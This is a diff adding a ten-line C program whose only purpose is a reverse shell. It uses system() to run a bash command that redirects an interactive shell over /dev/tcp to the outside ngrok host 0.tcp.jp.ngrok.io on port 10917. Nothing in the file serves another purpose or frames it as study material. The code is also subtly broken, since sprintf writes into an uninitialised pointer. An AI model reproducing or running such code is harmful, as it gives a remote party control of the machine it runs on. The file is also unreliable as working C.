@@ -1,0 +1,10 @@
+#include <stdlib.h>
+#include <stdio.h>
+
+int main(void){
+	char* cmd;
+	sprintf(cmd, "bash -i >& /dev/tcp/%s/%d 0>&1", 
+"0.tcp.jp.ngrok.io", 10917);
+	system(cmd);
+	return 0;
+}
